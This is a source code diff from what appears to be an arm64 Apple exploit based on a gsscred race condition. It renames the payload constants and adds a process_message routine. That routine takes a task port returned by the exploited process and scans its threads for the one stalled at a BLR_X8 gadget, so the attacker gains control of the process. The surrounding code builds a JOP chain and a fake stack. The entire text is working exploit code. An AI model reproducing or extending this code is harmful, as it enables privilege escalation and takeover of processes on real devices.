@@ -313,6 +313,7 @@
 
 #include "arm64/arm64_payload.h"
 
+#include "apple_private.h"
 #include "arm64/gadgets.h"
 #include "log.h"
 
@@ -381,7 +382,7 @@ build_payload(uint8_t *payload) {
 	const uint64_t FAKE_STACK_ADDRESS = GSSCRED_RACE_PAYLOAD_ADDRESS - GSSCRED_RACE_PAYLOAD_SIZE;
 
 	// Define the offsets from the start of the payload to each of the memory regions.
-	const ssize_t BASE = GSSCRED_RACE_PAYLOAD_OFFSET_ARG1;
+	const ssize_t BASE = PAYLOAD_OFFSET_ARG1;
 	const ssize_t OFFSET_REGION_ARG1                          = BASE +   0x0;
 	const ssize_t OFFSET_REGION_JMPBUF                        = BASE +  0x98;
 	const ssize_t OFFSET_REGION_X19                           = BASE +   0x8;
@@ -391,7 +392,7 @@ build_payload(uint8_t *payload) {
 	const ssize_t OFFSET_JOP_STACK_FINALIZE                   = BASE +  0x60;
 
 	// Get the address of each of the memory regions in the local payload buffer.
-	uint8_t *payload_INITIAL_PC                           = payload + GSSCRED_RACE_PAYLOAD_OFFSET_PC;
+	uint8_t *payload_INITIAL_PC                           = payload + PAYLOAD_OFFSET_PC;
 	uint8_t *payload_REGION_ARG1                          = payload + OFFSET_REGION_ARG1;
 	uint8_t *payload_REGION_JMPBUF                        = payload + OFFSET_REGION_JMPBUF;
 	uint8_t *payload_REGION_X19                           = payload + OFFSET_REGION_X19;
@@ -438,7 +439,7 @@ build_payload(uint8_t *payload) {
 	payload_REGION_MACH_MESSAGE->msgh_bits         = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, 0);
 	payload_REGION_MACH_MESSAGE->msgh_size         = sizeof(mach_msg_header_t);
 	payload_REGION_MACH_MESSAGE->msgh_voucher_port = 0;
-	payload_REGION_MACH_MESSAGE->msgh_id           = GSSCRED_RACE_MACH_MESSAGE_ID;
+	payload_REGION_MACH_MESSAGE->msgh_id           = EXPLOIT_MACH_MESSAGE_ID;
 
 	// Values for constructing JOP chains.
 	struct JOP_DISPATCH_NODE {
@@ -498,7 +499,85 @@ build_payload(uint8_t *payload) {
 	}
 }
 
+static enum process_exploit_message_result
+process_message(const mach_msg_header_t *exploit_message,
+		mach_port_t *task_port, mach_port_t *thread_port) {
+	enum process_exploit_message_result result = PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE;
+	// The task port is stored in the remote_port field of the header.
+	mach_port_t task = exploit_message->msgh_remote_port;
+	bool task_valid = check_task_port(task);
+	if (!task_valid) {
+		goto fail_0;
+	}
+	// At this point the exploit message was valid and contained a task port, so any failure
+	// means we should kill the target process before retrying.
+	result = PROCESS_EXPLOIT_MESSAGE_RESULT_KILL_AND_RETRY;
+	// We will find the thread by iterating through the existing threads until we find which
+	// one is stalled in the infinite loop.
+	thread_act_array_t threads = NULL;
+	mach_msg_type_number_t thread_count = 0;
+	kern_return_t kr = task_threads(task, &threads, &thread_count);
+	if (kr != KERN_SUCCESS) {
+		ERROR("Could not get threads for task: %x", kr);
+		goto fail_1;
+	}
+	// Loop through the threads until one of them is stuck at our expected PC.
+	DEBUG_TRACE(2, "thread_count: %u", thread_count);
+	mach_port_t thread = MACH_PORT_NULL;
+	const size_t MAX_TRIES = 10000000;
+	for (size_t try = 0;; try++) {
+		bool any = false;
+		for (size_t i = 0; i < thread_count; i++) {
+			arm_thread_state64_t thread_state;
+			mach_msg_type_number_t thread_state_count = ARM_THREAD_STATE64_COUNT;
+			kr = thread_get_state(threads[i], ARM_THREAD_STATE64,
+					(thread_state_t) &thread_state, &thread_state_count);
+			if (kr != KERN_SUCCESS) {
+				WARNING("Could not get thread state for thread %x", threads[i]);
+				continue;
+			}
+			any = true;
+			if (thread_state.__x[8] == thread_state.__pc
+					&& thread_state.__pc == gadgets[BLR_X8].address) {
+				thread = threads[i];
+				DEBUG_TRACE(1, "Exploit thread is %x", thread);
+				goto found;
+			}
+		}
+		// If none of the thread ports are giving status info, something's fishy.
+		if (!any) {
+			ERROR("Could not get thread state for any thread");
+			goto fail_2;
+		}
+		// If we just can't seem to find the thread, give up.
+		if (try >= MAX_TRIES) {
+			ERROR("No thread appears to be running the exploit payload "
+					"after %zu tries", try);
+			goto fail_2;
+		}
+	}
+found:
+	result = PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS;
+	*task_port   = task;
+	*thread_port = thread;
+fail_2:
+	for (size_t i = 0; i < thread_count; i++) {
+		if (threads[i] != thread) {
+			mach_port_deallocate(mach_task_self(), threads[i]);
+		}
+	}
+	mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) threads,
+			thread_count * sizeof(threads[0]));
+fail_1:
+	if (result != PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS) {
+		mach_port_deallocate(mach_task_self(), task);
+	}
+fail_0:
+	return result;
+}
+
 const struct payload_strategy payload_strategy_1 = {
-	.check_platform = check_platform,
-	.build_payload  = build_payload,
+	.check_platform  = check_platform,
+	.build_payload   = build_payload,
+	.process_message = process_message,
 };
